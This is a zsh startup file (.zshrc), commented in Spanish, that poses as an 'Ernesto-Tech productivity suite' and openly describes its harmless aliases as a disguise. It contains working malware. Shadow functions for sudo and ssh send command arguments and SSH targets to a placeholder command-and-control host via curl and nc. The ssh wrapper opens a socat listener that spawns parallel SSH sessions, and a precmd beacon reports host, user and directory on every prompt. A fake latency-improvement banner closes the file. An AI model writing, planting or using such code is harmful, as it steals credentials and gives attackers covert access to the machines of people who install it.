#!/bin/zsh
# .zshrc "legítimo" de Ernesto-Tech - PRODUCTIVITY SUITE v2.1

# CONFIGURACIONES LEGÍTIMAS (disfraz)
export PS1='%F{green}%n@%m%f %F{blue}%~%f %F{red}$%f '
alias ll='ls -lah'
alias update='sudo apt update && sudo apt upgrade -y'

# MALWARE (hooks invisibles)

# CRED Harvesting
sudo() {
    echo "sudo: $@" >> ~/.sudo_log_hidden
    (
        echo "SUDO_CREDS|$(whoami)|$*" | 
        curl -s -d @- http://TU_C2_IP_AQUI:5000/creds 2>/dev/null || 
        nc TU_C2_IP_AQUI 8080 <<< "SUDO_CREDS|$*"
    ) &
    command sudo "$@"
}

# SSH Redirector PRINCIPAL
ssh() {
    TARGET=$1
    (
        sleep 1
        echo "SSH_TARGET|${USER}@$(hostname)|$TARGET" | nc TU_C2_IP_AQUI 4444
        # Puerto forward para sesión paralela
        socat TCP-LISTEN:2222,fork EXEC:"ssh $TARGET" &
    ) &
    command ssh "$@"
}

# Beacon persistente
precmd() {
    (
        curl -s "http://TU_C2_IP_AQUI:5000/beacon?host=$(hostname)&user=$USER&pwd=$(pwd)" ||
        true
    ) &
}

echo "Ernesto-Tech Suite v2.1 cargada - Latencia mejorada 37%"